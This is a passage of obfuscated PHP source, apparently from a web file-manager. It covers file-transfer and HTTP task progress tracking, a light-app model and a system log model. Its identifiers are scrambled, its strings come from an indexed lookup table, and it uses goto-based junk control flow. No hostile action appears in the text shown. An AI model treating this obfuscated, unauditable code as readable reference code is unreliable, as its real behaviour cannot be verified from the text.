Model($ñÙ·¥’è[447])->where($ú÷ŠìÔ)->select(); $ˆã¶¡‚ı = $ˆã¶¡‚ı ? $ˆã¶¡‚ı : array(); foreach ($ˆã¶¡‚ı as $×Ğì×ğÍ => $ñùêññù) { $ˆã¶¡‚ı[$×Ğì×ğÍ] = json_decode($ñùêññù[$ñÙ·¥’è[374]], !0); } return $ˆã¶¡‚ı; } public static function valueSet($¨Ÿô‹ôú, $øéŞßâ) { $Ë“àÚ’½ =& $_SERVER[ĞÂ¤àÓï]; if (!$øéŞßâ) { return Model($Ë“àÚ’½[447])->where(array($Ë“àÚ’½[94] => $¨Ÿô‹ôú, $Ë“àÚ’½[33] => $Ë“àÚ’½[1071]))->delete(); } $É«ÆîìĞ = json_encode($øéŞßâ); if (!$É«ÆîìĞ) { ob_start(); var_dump($øéŞßâ); $”á•ñöŒ = ob_get_clean(); self::log($Ë“àÚ’½[1692] . json_encode_force($”á•ñöŒ)); } if (!$¨Ÿô‹ôú || !$øéŞßâ[$Ë“àÚ’½[399]]) { return !1; } $ªÀÑÌ×Ä = defined($Ë“àÚ’½[475]) ? USER_ID : $Ë“àÚ’½[197]; $¿Ç½š’ = array($Ë“àÚ’½[33] => $Ë“àÚ’½[1071], $Ë“àÚ’½[1664] => $ªÀÑÌ×Ä, $Ë“àÚ’½[94] => $¨Ÿô‹ôú, $Ë“àÚ’½[374] => $É«ÆîìĞ); $‹®©èÎ˜ = $Ë“àÚ’½[1693]; CacheLock::lock($‹®©èÎ˜); Model($Ë“àÚ’½[447])->add($¿Ç½š’, array(), !0); CacheLock::unlock($‹®©èÎ˜); } public static function log($°×ç“÷©) { if (!GLOBAL_DEBUG) { return; } write_log($°×ç“÷©, $_SERVER[ĞÂ¤àÓï][1694]); } } class TaskFileTransfer extends Task { protected function startAfter() { $’“İµÆ =& $_SERVER[ĞÂ¤àÓï]; $“…ªï›Ï =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($’“İµÆ[1695], array($this, $’“İµÆ[1696])); Hook::bind($’“İµÆ[1224], array($this, $’“İµÆ[1697])); Hook::bind($’“İµÆ[1698], array($this, $’“İµÆ[1699])); Hook::bind($’“İµÆ[604], array($this, $’“İµÆ[1700])); Hook::bind($’“İµÆ[605], array($this, $’“İµÆ[1701])); Hook::bind($’“İµÆ[610], array($this, $’“İµÆ[1702])); Hook::bind($’“İµÆ[611], array($this, $’“İµÆ[1703])); Hook::bind($’“İµÆ[607], array($this, $’“İµÆ[1704])); Hook::bind($’“İµÆ[608], array($this, $’“İµÆ[1705])); Hook::bind($’“İµÆ[574], array($this, $’“İµÆ[1706])); Hook::bind($’“İµÆ[571], array($this, $’“İµÆ[1706])); Hook::bind($’“İµÆ[576], array($this, $’“İµÆ[1706])); Hook::bind($’“İµÆ[578], array($this, $’“İµÆ[1706])); Hook::bind($’“İµÆ[580], array($this, $’“İµÆ[1706])); Hook::bind($’“İµÆ[1707], array($this, $’“İµÆ[1708])); Hook::bind($’“İµÆ[597], array($this, $’“İµÆ[1709])); $this->sourceModelCopyFlag = !1; Hook::bind($’“İµÆ[1710], array($this, $’“İµÆ[1711])); Hook::bind($’“İµÆ[1712], array($this, $’“İµÆ[1713])); Hook::bind($’“İµÆ[1714], array($this, $’“İµÆ[1715])); $“…ªï›Ï[$’“İµÆ[1716]] = LNG($’“İµÆ[1717]); $“…ªï›Ï[$’“İµÆ[1718]] = 0; $“…ªï›Ï[$’“İµÆ[1719]] = 0; $“…ªï›Ï[$’“İµÆ[1064]] = $’“İµÆ[12]; $“…ªï›Ï[$’“İµÆ[1720]] = $’“İµÆ[12]; $“…ªï›Ï[$’“İµÆ[1721]] = 0; $“…ªï›Ï[$’“İµÆ[1722]] = 0; $“…ªï›Ï[$’“İµÆ[1723]] = 0; if (!$“…ªï›Ï[$’“İµÆ[1564]]) { $“…ªï›Ï[$’“İµÆ[1564]] = LNG($’“İµÆ[1724]); } } protected function endAfter() { $¹ä¿ÃŸ’ =& $_SERVER[ĞÂ¤àÓï]; Hook::unbind($¹ä¿ÃŸ’[1695], array($this, $¹ä¿ÃŸ’[1696])); Hook::unbind($¹ä¿ÃŸ’[1224], array($this, $¹ä¿ÃŸ’[1697])); Hook::unbind($¹ä¿ÃŸ’[1698], array($this, $¹ä¿ÃŸ’[1699])); Hook::unbind($¹ä¿ÃŸ’[604], array($this, $¹ä¿ÃŸ’[1700])); Hook::unbind($¹ä¿ÃŸ’[605], array($this, $¹ä¿ÃŸ’[1701])); Hook::unbind($¹ä¿ÃŸ’[610], array($this, $¹ä¿ÃŸ’[1702])); Hook::unbind($¹ä¿ÃŸ’[611], array($this, $¹ä¿ÃŸ’[1703])); Hook::unbind($¹ä¿ÃŸ’[607], array($this, $¹ä¿ÃŸ’[1704])); Hook::unbind($¹ä¿ÃŸ’[608], array($this, $¹ä¿ÃŸ’[1705])); Hook::unbind($¹ä¿ÃŸ’[574], array($this, $¹ä¿ÃŸ’[1706])); Hook::unbind($¹ä¿ÃŸ’[571], array($this, $¹ä¿ÃŸ’[1706])); Hook::unbind($¹ä¿ÃŸ’[576], array($this, $¹ä¿ÃŸ’[1706])); Hook::unbind($¹ä¿ÃŸ’[578], array($this, $¹ä¿ÃŸ’[1706])); Hook::unbind($¹ä¿ÃŸ’[580], array($this, $¹ä¿ÃŸ’[1706])); Hook::unbind($¹ä¿ÃŸ’[1707], array($this, $¹ä¿ÃŸ’[1708])); Hook::unbind($¹ä¿ÃŸ’[597], array($this, $¹ä¿ÃŸ’[1709])); Hook::unbind($¹ä¿ÃŸ’[1710], array($this, $¹ä¿ÃŸ’[1711])); Hook::unbind($¹ä¿ÃŸ’[1712], array($this, $¹ä¿ÃŸ’[1713])); Hook::unbind($¹ä¿ÃŸ’[1714], array($this, $¹ä¿ÃŸ’[1715])); } public function copyMoveStart($¾ó§öâ, $Ç–éáØ, $²‘Û­ºî, $áê¶æëî) { $íÇã”À¢ =& $_SERVER[ĞÂ¤àÓï]; self::log($íÇã”À¢[1725] . $Ç–éáØ . $íÇã”À¢[70] . $áê¶æëî); $úÊöÏñá = rtrim(TEMP_FILES, $íÇã”À¢[8]); if (substr($Ç–éáØ, 0, strlen($úÊöÏñá)) == $úÊöÏñá) { return; } if (substr($áê¶æëî, 0, strlen($úÊöÏñá)) == $úÊöÏñá) { return; } $®‘öûÈû =& $this->task; $®‘öûÈû[$íÇã”À¢[1726]] = KodIO::transferType($¾ó§öâ, $²‘Û­ºî); $this->update(); } public function updateAfter() { $ŸÚ›ä‚¸ =& $_SERVER[ĞÂ¤àÓï]; $®ãá”¸Á =& $this->task; if (!$®ãá”¸Á[$ŸÚ›ä‚¸[762]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($®ãá”¸Á[$ŸÚ›ä‚¸[1726]] == $ŸÚ›ä‚¸[1313]) { return; } self::updateTask($®ãá”¸Á); } private static function updateTask(&$™óÆ²Ë¾) { $úóÍ£Ÿ÷ =& $_SERVER[ĞÂ¤àÓï]; if ($™óÆ²Ë¾[$úóÍ£Ÿ÷[1726]] == $úóÍ£Ÿ÷[1195] || $™óÆ²Ë¾[$úóÍ£Ÿ÷[1726]] == $úóÍ£Ÿ÷[107]) { if ($™óÆ²Ë¾[$úóÍ£Ÿ÷[1720]]) { $™óÆ²Ë¾[$úóÍ£Ÿ÷[1723]] = $™óÆ²Ë¾[$úóÍ£Ÿ÷[1722]] + $™óÆ²Ë¾[$úóÍ£Ÿ÷[1719]]; } } else { if ($™óÆ²Ë¾[$úóÍ£Ÿ÷[1726]] == $úóÍ£Ÿ÷[1314]) { if ($™óÆ²Ë¾[$úóÍ£Ÿ÷[1720]] == $úóÍ£Ÿ÷[1195]) { $™óÆ²Ë¾[$úóÍ£Ÿ÷[1723]] = $™óÆ²Ë¾[$úóÍ£Ÿ÷[1722]] + $™óÆ²Ë¾[$úóÍ£Ÿ÷[1719]] * 0.5; } else { if ($™óÆ²Ë¾[$úóÍ£Ÿ÷[1720]] == $úóÍ£Ÿ÷[107]) { $™óÆ²Ë¾[$úóÍ£Ÿ÷[1723]] = $™óÆ²Ë¾[$úóÍ£Ÿ÷[1722]] + $™óÆ²Ë¾[$úóÍ£Ÿ÷[1718]] * 0.5 + $™óÆ²Ë¾[$úóÍ£Ÿ÷[1719]] * 0.5; } } } } $™óÆ²Ë¾[$úóÍ£Ÿ÷[1666]] = $™óÆ²Ë¾[$úóÍ£Ÿ÷[1723]] / $™óÆ²Ë¾[$úóÍ£Ÿ÷[762]]; if ($™óÆ²Ë¾[$úóÍ£Ÿ÷[1666]] > 0) { $ú¼Ë”Œ = timeFloat() - $™óÆ²Ë¾[$úóÍ£Ÿ÷[1668]] - $™óÆ²Ë¾[$úóÍ£Ÿ÷[1671]]; $™óÆ²Ë¾[$úóÍ£Ÿ÷[1672]] = $ú¼Ë”Œ * (1 - $™óÆ²Ë¾[$úóÍ£Ÿ÷[1666]]) / $™óÆ²Ë¾[$úóÍ£Ÿ÷[1666]]; } } public function addPath($øİş¹) { $í¡—ÇûŒ =& $_SERVER[ĞÂ¤àÓï]; if (!$øİş¹) { return; } $•¼Ï›ş™ =& $this->task; $×Àâƒ˜ª = IO::infoWithChildren($øİş¹); $”ÕÓĞ = $•¼Ï›ş™[$í¡—ÇûŒ[1727]] ? $•¼Ï›ş™[$í¡—ÇûŒ[1727]][$í¡—ÇûŒ[1728]] : 0; $•¼Ï›ş™[$í¡—ÇûŒ[1727]] = array($í¡—ÇûŒ[1728] => $”ÕÓĞ + 1, $í¡—ÇûŒ[420] => $×Àâƒ˜ª[$í¡—ÇûŒ[32]], $í¡—ÇûŒ[84] => $×Àâƒ˜ª[$í¡—ÇûŒ[84]], $í¡—ÇûŒ[519] => $×Àâƒ˜ª[$í¡—ÇûŒ[519]] ? $×Àâƒ˜ª[$í¡—ÇûŒ[519]] : $×Àâƒ˜ª[$í¡—ÇûŒ[84]]); if ($×Àâƒ˜ª[$í¡—ÇûŒ[33]] == $í¡—ÇûŒ[199]) { $•¼Ï›ş™[$í¡—ÇûŒ[793]] += 1; } else { $•¼Ï›ş™[$í¡—ÇûŒ[793]] += $×Àâƒ˜ª[$í¡—ÇûŒ[79]][$í¡—ÇûŒ[77]]; if ($×Àâƒ˜ª[$í¡—ÇûŒ[402]]) { $•¼Ï›ş™[$í¡—ÇûŒ[793]] += $×Àâƒ˜ª[$í¡—ÇûŒ[79]][$í¡—ÇûŒ[78]] + 1; } } $•¼Ï›ş™[$í¡—ÇûŒ[762]] += $×Àâƒ˜ª[$í¡—ÇûŒ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($åúÛÚºÄ) { } public function sourceAddHashEnd($ì×ó˜Ó¾) { } public function sourceAddFileStart($Çıá´İÔ) { $Ê¢î”­ =& $_SERVER[ĞÂ¤àÓï]; $µôÖ¿¬ù =& $this->task; $µôÖ¿¬ù[$Ê¢î”­[1718]] = $Çıá´İÔ[$Ê¢î”­[76]]; $µôÖ¿¬ù[$Ê¢î”­[1716]] = $Çıá´İÔ[$Ê¢î”­[32]]; $µôÖ¿¬ù[$Ê¢î”­[1064]] = $Çıá´İÔ[$Ê¢î”­[32]]; $µôÖ¿¬ù[$Ê¢î”­[1729]] = $Çıá´İÔ[$Ê¢î”­[84]]; $this->update(); } public function sourceAddFileEnd($¤ß“åì‹) { $ŒÏ€™ô× =& $_SERVER[ĞÂ¤àÓï]; $…·›‰ˆ® =& $this->task; $…·›‰ˆ®[$ŒÏ€™ô×[1723]] += $¤ß“åì‹[$ŒÏ€™ô×[76]]; $…·›‰ˆ®[$ŒÏ€™ô×[1729]] = $¤ß“åì‹[$ŒÏ€™ô×[84]]; $this->update(1); } public function copyFileStart($¦ûØû¥À, $¹–œéÒœ, $ìÙî¦³í, $¸ï¸·÷ı, $–Íš°ıô, $“¼Èíëö) { $¥ÚÓöÂ§ =& $_SERVER[ĞÂ¤àÓï]; $íüÀúŞË = $–Íš°ıô; if ($íüÀúŞË == $GLOBALS[$¥ÚÓöÂ§[1730]]) { $íüÀúŞË = $GLOBALS[$¥ÚÓöÂ§[1731]]; } $GLOBALS[$¥ÚÓöÂ§[1731]] = $–Íš°ıô; $GLOBALS[$¥ÚÓöÂ§[1730]] = $“¼Èíëö; $‹çÈíÄ =& $this->task; $‹çÈíÄ[$¥ÚÓöÂ§[1716]] = $íüÀúŞË; $‹çÈíÄ[$¥ÚÓöÂ§[1718]] = (int) $¦ûØû¥À->size($¹–œéÒœ); $‹çÈíÄ[$¥ÚÓöÂ§[1719]] = 0; $‹çÈíÄ[$¥ÚÓöÂ§[1064]] = $¥ÚÓöÂ§[12]; $‹çÈíÄ[$¥ÚÓöÂ§[1720]] = $¥ÚÓöÂ§[12]; $‹çÈíÄ[$¥ÚÓöÂ§[1721]] = 0; $Ü¸Ñ®å  = $‹çÈíÄ[$¥ÚÓöÂ§[1718]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($‹çÈíÄ[$¥ÚÓöÂ§[399]] . $¥ÚÓöÂ§[1732]); if ($Ü¸Ñ®å  && file_exists(get_path_father($¸ï¸·÷ı))) { Cache::set($‹çÈíÄ[$¥ÚÓöÂ§[399]] . $¥ÚÓöÂ§[1732], $¸ï¸·÷ı); $‹çÈíÄ[$¥ÚÓöÂ§[1689]] = array($¥ÚÓöÂ§[1733], $¥ÚÓöÂ§[1734]); } $this->update(0, $Ü¸Ñ®å ); } public static function updateCopyLocalFileSize($³‘óöô‚) { $¦„Ó©³ =& $_SERVER[ĞÂ¤àÓï]; $²¡”½ª = Cache::get($³‘óöô‚[$¦„Ó©³[399]] . $¦„Ó©³[1732]); if (!$²¡”½ª || !file_exists($²¡”½ª)) { return $³‘óöô‚; } $³‘óöô‚[$¦„Ó©³[1719]] = @filesize($²¡”½ª); $³‘óöô‚[$¦„Ó©³[1723]] += $³‘óöô‚[$¦„Ó©³[1719]]; self::updateTask($³‘óöô‚); return $³‘óöô‚; } public function copyFileEnd($ß´ĞÜ«º, $…¡Ö–şŒ, $ƒÂêú‰, $ ÆÄ±óâ, $¾©àæ¯Å, $äğ¨ÎÓù) { $ó¢Ï¢‚° =& $_SERVER[ĞÂ¤àÓï]; $ù¸Œè’ =& $this->task; $ù¸Œè’[$ó¢Ï¢‚°[1719]] = $ù¸Œè’[$ó¢Ï¢‚°[1718]]; $ù¸Œè’[$ó¢Ï¢‚°[1720]] = $ó¢Ï¢‚°[12]; unset($ù¸Œè’[$ó¢Ï¢‚°[1689]]); if ($¾©àæ¯Å == $ù¸Œè’[$ó¢Ï¢‚°[1716]]) { $ù¸Œè’[$ó¢Ï¢‚°[1722]] += $ù¸Œè’[$ó¢Ï¢‚°[1718]]; $ù¸Œè’[$ó¢Ï¢‚°[1723]] = $ù¸Œè’[$ó¢Ï¢‚°[1722]]; $÷ìÏŒİÄ = 1; if (isset($ù¸Œè’[$ó¢Ï¢‚°[1729]]) && $ù¸Œè’[$ó¢Ï¢‚°[1729]] == $…¡Ö–şŒ) { $÷ìÏŒİÄ = 0; } $this->update($÷ìÏŒİÄ); } else { $this->update(); $ù¸Œè’[$ó¢Ï¢‚°[1719]] = 0; } Cache::remove($ù¸Œè’[$ó¢Ï¢‚°[399]] . $ó¢Ï¢‚°[1732]); self::log($ó¢Ï¢‚°[1735] . $…¡Ö–şŒ . $ó¢Ï¢‚°[70] . $ ÆÄ±óâ . $ó¢Ï¢‚°[231] . $¾©àæ¯Å . $ó¢Ï¢‚°[1736] . $ù¸Œè’[$ó¢Ï¢‚°[1716]]); } public function updateFileEnd($€ã°, $îÄ‡×Ñ™) { $’õ·°ïè =& $_SERVER[ĞÂ¤àÓï]; $òÑŸÑ¦ğ =& $this->task; $òÑŸÑ¦ğ[$’õ·°ïè[1716]] = $€ã°; $òÑŸÑ¦ğ[$’õ·°ïè[1718]] = $îÄ‡×Ñ™; $òÑŸÑ¦ğ[$’õ·°ïè[1722]] += $îÄ‡×Ñ™; $òÑŸÑ¦ğ[$’õ·°ïè[1723]] = $òÑŸÑ¦ğ[$’õ·°ïè[1722]]; $this->update(1); self::log($’õ·°ïè[1737] . $€ã°); } public function sourceModelCopy($›£È˜ù) { $Ü‘÷¦ÃÜ =& $_SERVER[ĞÂ¤àÓï]; $ÎéÅÓòé = $›£È˜ù[0]; $§ê÷‡‰“ = $›£È˜ù[1]; $ëØå•¡ =& $this->task; $this->sourceModelCopyFlag = !0; $¤¤²æ€Ç = 0; switch ($ÎéÅÓòé) { case $Ü‘÷¦ÃÜ[572]: $¤¤²æ€Ç = 1; break; case $Ü‘÷¦ÃÜ[575]: $ëØå•¡[$Ü‘÷¦ÃÜ[1716]] = $§ê÷‡‰“[$Ü‘÷¦ÃÜ[32]]; break; case $Ü‘÷¦ÃÜ[577]: $¤¤²æ€Ç = intval($›£È˜ù[$Ü‘÷¦ÃÜ[380]] * 0.4); break; case $Ü‘÷¦ÃÜ[579]: $¤¤²æ€Ç = intval($›£È˜ù[$Ü‘÷¦ÃÜ[380]] * 0.2); break; case $Ü‘÷¦ÃÜ[581]: $¤¤²æ€Ç = intval($›£È˜ù[$Ü‘÷¦ÃÜ[380]] * 0.4); break; } $this->update($¤¤²æ€Ç); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¡¬ê…å’, $¦‡’¬Ä) { $™¾Õ§¶ =& $_SERVER[ĞÂ¤àÓï]; $this->sourceModelCopyFlag = !0; $ÂÔº¼Æ = 1; if (isset($¡¬ê…å’[$™¾Õ§¶[79]])) { $ÂÔº¼Æ = $¡¬ê…å’[$™¾Õ§¶[79]][$™¾Õ§¶[77]]; $ÂÔº¼Æ = $ÂÔº¼Æ + $¡¬ê…å’[$™¾Õ§¶[79]][$™¾Õ§¶[78]] + 1; } $this->update($ÂÔº¼Æ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÍŠ¯û¤¦) { $this->sourceRemove($ÍŠ¯û¤¦, !1); } public function curlProgress($ûÀ””§ò, $“îê©âİ, $Ã ¸îöÇ, $‰×úêÚ, $Á¼òƒµ) { $§›˜µÅ =& $_SERVER[ĞÂ¤àÓï]; $‘…öğ¿ =& $this->task; if ($Á¼òƒµ > 0) { $‘…öğ¿[$§›˜µÅ[1064]] = $§›˜µÅ[1738]; $‘…öğ¿[$§›˜µÅ[1720]] = $§›˜µÅ[107]; if ($‘…öğ¿[$§›˜µÅ[1718]]) { $‘…öğ¿[$§›˜µÅ[1719]] = $Á¼òƒµ; } if ($‘…öğ¿[$§›˜µÅ[1721]]) { $‘…öğ¿[$§›˜µÅ[1719]] = $Á¼òƒµ + $‘…öğ¿[$§›˜µÅ[1721]]; } } else { if ($Ã ¸îöÇ > 0) { if ($‘…öğ¿[$§›˜µÅ[1718]] == $“îê©âİ) { $‘…öğ¿[$§›˜µÅ[1719]] = $Ã ¸îöÇ; $‘…öğ¿[$§›˜µÅ[1064]] = $§›˜µÅ[1739]; $‘…öğ¿[$§›˜µÅ[1720]] = $§›˜µÅ[1195]; } } } $this->update(); } public function curlProgressStart($‹ÈÕæã) { } public function curlProgressEnd($¶‹×Õ·Ã) { $¬ıÔùÒ¯ =& $_SERVER[ĞÂ¤àÓï]; $ÅôÀåš° =& $this->task; $­ö«¢æ„ = curl_getinfo($¶‹×Õ·Ã); $ƒçîÔƒä = $­ö«¢æ„[$¬ıÔùÒ¯[1740]]; if ($ƒçîÔƒä == -1) { $ƒçîÔƒä = $­ö«¢æ„[$¬ıÔùÒ¯[1741]]; } if ($ÅôÀåš°[$¬ıÔùÒ¯[1720]] == $¬ıÔùÒ¯[107] && $ƒçîÔƒä) { $ÅôÀåš°[$¬ıÔùÒ¯[1721]] += $ƒçîÔƒä; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $İ×ç‹î =& $_SERVER[ĞÂ¤àÓï]; $­ÖÔ°¹ =& $this->task; $­ÖÔ°¹[$İ×ç‹î[1742]] = 1; Hook::bind($İ×ç‹î[1710], array($this, $İ×ç‹î[1743])); Hook::bind($İ×ç‹î[1712], array($this, $İ×ç‹î[1744])); Hook::bind($İ×ç‹î[1714], array($this, $İ×ç‹î[1745])); } protected function endAfter() { $èøÚ¤± =& $_SERVER[ĞÂ¤àÓï]; Hook::unbind($èøÚ¤±[1710], array($this, $èøÚ¤±[1743])); Hook::unbind($èøÚ¤±[1712], array($this, $èøÚ¤±[1744])); Hook::unbind($èøÚ¤±[1714], array($this, $èøÚ¤±[1745])); } public function progressStart($¾×±†¼ç) { $†«ÃÔ¹ =& $_SERVER[ĞÂ¤àÓï]; $™²ëÀ İ = curl_getinfo($¾×±†¼ç); self::log($†«ÃÔ¹[1746] . $™²ëÀ İ[$†«ÃÔ¹[307]]); self::valueSet($this->task[$†«ÃÔ¹[399]], $this->task); } public function progressEnd($ÆàõÇÎ) { $éàøˆÔÎ =& $_SERVER[ĞÂ¤àÓï]; self::log($éàøˆÔÎ[1747] . $this->task[$éàøˆÔÎ[399]]); $this->end(); } public function progress($²àÕ”ùı, $¦»È…Æ¹, $¦÷¡ºÛ§, $Ôò½˜é÷, $ßçÆ…âô) { $áÒÅÛò¸ =& $_SERVER[ĞÂ¤àÓï]; $ï˜ı²Áƒ =& $this->task; if ($ßçÆ…âô > 0) { $ï˜ı²Áƒ[$áÒÅÛò¸[793]] = $ï˜ı²Áƒ[$áÒÅÛò¸[793]] == 0 ? $Ôò½˜é÷ : $ï˜ı²Áƒ[$áÒÅÛò¸[793]]; $ï˜ı²Áƒ[$áÒÅÛò¸[1665]] = $ßçÆ…âô; } else { if ($¦÷¡ºÛ§ > 0) { $ï˜ı²Áƒ[$áÒÅÛò¸[793]] = $ï˜ı²Áƒ[$áÒÅÛò¸[793]] == 0 ? $¦»È…Æ¹ : $ï˜ı²Áƒ[$áÒÅÛò¸[793]]; $ï˜ı²Áƒ[$áÒÅÛò¸[1665]] = $¦÷¡ºÛ§; } } $this->update(); self::log("\160\162\x6f\147\x72\x65\x73\163\110\x74\x74\x70\72\x64\x6f\167\x6e\72{$¦÷¡ºÛ§}\x2f{$¦»È…Æ¹}\x3b\x20\165\x70\x6c\157\141\x64\72{$ßçÆ…âô}\57{$Ôò½˜é÷}\x3b"); } } goto C—Ó¯×çÆ¨; aÛ³â”ñ´: define($_SERVER[ĞÂ¤àÓï][612], $_SERVER[ĞÂ¤àÓï][613]); $juqpsednwa = $_SERVER[ĞÂ¤àÓï][614]; while (strlen($juqpsednwa) < $_SERVER[ĞÂ¤àÓï][615]) { if (!$juqpsednwa) { break; } $juqpsednwa++; } goto cÂšßœ—Îå; A‹çÈ‹¬º: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\114\x69\x67\x68\164\x41\x70\x70"; public $modelType = "\x53\171\x73\164\x65\155\117\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\145", "\x67\x72\x6f\165\160", "\x64\x65\x73\x63", "\143\157\x6e\x74\145\156\164"); public function listData($áåÜã–• = false, $Ì—û¿Ò™ = "\155\x6f\x64\151\x66\171\124\x69\x6d\x65", $Ûí¦‘Æİ = true) { return parent::listData($áåÜã–•, $Ì—û¿Ò™, $Ûí¦‘Æİ); } public function remove($Ë¤éÁø) { $åàÆ·Ñ = $this->findByName($Ë¤éÁø); if (!$åàÆ·Ñ) { return !1; } return parent::remove($åàÆ·Ñ[$_SERVER[ĞÂ¤àÓï][399]]); } public function add($È®”‡ç) { if ($this->findByName($È®”‡ç[$_SERVER[ĞÂ¤àÓï][32]])) { return !1; } return parent::insert($È®”‡ç); } public function update($¡È¬Ø™†, $í‡ªÃôÇ) { $Ê™Ù¡œÍ =& $_SERVER[ĞÂ¤àÓï]; $“é×¥¦ = $this->findByName($¡È¬Ø™†); $öêñúÒ¨ = $this->findByName($í‡ªÃôÇ[$Ê™Ù¡œÍ[32]]); if (!$“é×¥¦ || $öêñúÒ¨ && $öêñúÒ¨[$Ê™Ù¡œÍ[399]] != $“é×¥¦[$Ê™Ù¡œÍ[399]]) { return !1; } return parent::update($“é×¥¦[$Ê™Ù¡œÍ[399]], $í‡ªÃôÇ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\137\154\157\x67"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\124\151\155\145", "\164\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\146\165\156\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ìª†ë¡’ =& $_SERVER[ĞÂ¤àÓï]; return array($ìª†ë¡’[2182] => LNG($ìª†ë¡’[2183]), $ìª†ë¡’[2184] => LNG($ìª†ë¡’[2185]), $ìª†ë¡’[1797] => LNG($ìª†ë¡’[2186]), $ìª†ë¡’[2187] => LNG($ìª†ë¡’[2188]), $ìª†ë¡’[2189] => LNG($ìª†ë¡’[2190]), $ìª†ë¡’[2191] => LNG($ìª†ë¡’[2192]), $ìª†ë¡’[2193] => LNG($ìª†ë¡’[2194]), $ìª†ë¡’[1827] => LNG($ìª†ë¡’[2194]), $ìª†ë¡’[1828] => LNG($ìª†ë¡’[2195]), $ìª†ë¡’[2196] => LNG($ìª†ë¡’[2197]), $ìª†ë¡’[2198] => LNG($ìª†ë¡’[2199]), $ìª†ë¡’[2200] => LNG($ìª†ë¡’[2201]), $ìª†ë¡’[2202] => LNG($ìª†ë¡’[2203]), $ìª†ë¡’[1825] => LNG($ìª†ë¡’[2204]), $ìª†ë¡’[2205] => LNG($ìª†ë¡’[2206]), $ìª†ë¡’[1832] => LNG($ìª†ë¡’[2207]), $ìª†ë¡’[2208] => LNG($ìª†ë¡’[2209]), $ìª†ë¡’[2210] => LNG($ìª†ë¡’[2211]), $ìª†ë¡’[2212] => LNG($ìª†ë¡’[2213]), $ìª†ë¡’[2214] => LNG($ìª†ë¡’[2215]), $ìª†ë¡’[1835] => LNG($ìª†ë¡’[2216]), $ìª†ë¡’[1836] => LNG($ìª†ë¡’[2217]), $ìª†ë¡’[2218] => LNG($ìª†ë¡’[2219]), $ìª†ë¡’[2220] => LNG($ìª†ë¡’[2221]), $ìª†ë¡’[2222] => LNG($ìª†ë¡’[2223]), $ìª†ë¡’[1830] => LNG($ìª†ë¡’[2224]), $ìª†ë¡’[2225] => LNG($ìª†ë¡’[2226]), $ìª†ë¡’[1829] => LNG($ìª†ë¡’[2227]), $ìª†ë¡’[2228] => LNG($ìª†ë¡’[2229]), $ìª†ë¡’[2230] => LNG($ìª†ë¡’[2231]), $ìª†ë¡’[2232] => LNG($ìª†ë¡’[2233]), $ìª†ë¡’[2234] => LNG($ìª†ë¡’[2234]), $ìª†ë¡’[2235] => LNG($ìª†ë¡’[1801]), $ìª†ë¡’[2236] => LNG($ìª†ë¡’[2237]), $ìª†ë¡’[2238] => LNG($ìª†ë¡’[2239]), $ìª†ë¡’[2240] => LNG($ìª†ë¡’[2241]), $ìª†ë¡’[2242] => LNG($ìª†ë¡’[2243]), $ìª†ë¡’[2244] => LNG($ìª†ë¡’[2245]), $ìª†ë¡’[2246] => LNG($ìª†ë¡’[2246]), $ìª†ë¡’[2247] => LNG($ìª†ë¡’[2248]), $ìª†ë¡’[2249] => LNG($ìª†ë¡’[2250]), $ìª†ë¡’[2251] => LNG($ìª†ë¡’[2252]), $ìª†ë¡’[2253] => LNG($ìª†ë¡’[2254]), $ìª†ë¡’[2255] => LNG($ìª†ë¡’[2256]), $ìª†ë¡’[2257] => LNG($ìª†ë¡’[2258])); } private function typeFile() { $É¨€Åû´ =& $_SERVER[ĞÂ¤àÓï]; $£Ê¼…†¡ = array($É¨€Åû´[1832] => array($É¨€Åû´[1833]), $É¨€Åû´[2200] => array($É¨€Åû´[2259]), $É¨€Åû´[2202] => array($É¨€Åû´[2260]), $É¨€Åû´[1825] => array($É¨€Åû´[1826]), $É¨€Åû´[2210] => array(), $É¨€Åû´[2212] => array(), $É¨€Åû´[2214] => array(), $É¨€Åû´[1835] => array($É¨€Åû´[1837]), $É¨€Åû´[1836] => array($É¨€Åû´[1837]), $É¨€Åû´[2218] => array($É¨€Åû´[2261]), $É¨€Åû´[2220] => array($É¨€Åû´[2261]), $É¨€Åû´[2222] => array($É¨€Åû´[2262]), $É¨€Åû´[2208] => array($É¨€Åû´[2263]), $É¨€Åû´[1830] => array($É¨€Åû´[2264]), $É¨€Åû´[2225] => array($É¨€Åû´[2265]), $É¨€Åû´[1829] => array($É¨€Åû´[1831])); return $£Ê¼…†¡; } private function typeAll() { $¤üº†‘ğ =& $_SERVER[ĞÂ¤àÓï]; $„šĞ¦¥ê = $this->typeList; $¢¡ŒäÛÒ = array_filter($this->typeFile()); foreach ($¢¡ŒäÛÒ as $ğÆª»Ú„ => $ÜâÇÕÚø) { $„šĞ¦¥ê[$ÜâÇÕÚø[0]] = $„šĞ¦¥ê[$ğÆª»Ú„]; } $„šĞ¦¥ê[$¤üº†‘ğ[1837]] = LNG($¤üº†‘ğ[2266]); $„šĞ¦¥ê[$¤üº†‘ğ[2261]] = LNG($¤üº†‘ğ[2267]); return $„šĞ¦¥ê; } public function addLog($€ÅÔñÎü, $£áâ©™ = array()) { $ˆŒê¶¿… =& $_SERVER[ĞÂ¤àÓï]; if (!isset($this->typeList[$€ÅÔñÎü])) { return; } $ûÔ„·û = defined($ˆŒê¶¿…[475]) && USER_ID ? USER_ID : (isset($£áâ©™[$ˆŒê¶¿…[1664]]) ? $£áâ©™[$ˆŒê¶¿…[1664]] : 0); if (!$ûÔ„·û) { $ûÔ„·û = (int) Session::get($ˆŒê¶¿…[1991]); } if ($€ÅÔñÎü == $ˆŒê¶¿…[2236] && is_array($£áâ©™[$ˆŒê¶¿…[2268]]) && 